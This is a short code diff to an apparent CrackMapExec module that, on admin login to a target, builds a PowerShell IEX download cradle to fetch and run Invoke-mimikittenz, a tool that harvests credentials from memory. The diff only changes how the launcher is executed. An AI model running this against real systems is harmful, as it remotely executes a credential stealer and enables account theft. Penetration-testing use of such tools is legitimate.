@@ -24,9 +24,8 @@ class CMEModule:
     def on_admin_login(self, context, connection):
         command = 'Invoke-mimikittenz'
         launcher = gen_ps_iex_cradle(context, 'Invoke-mimikittenz.ps1', command)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
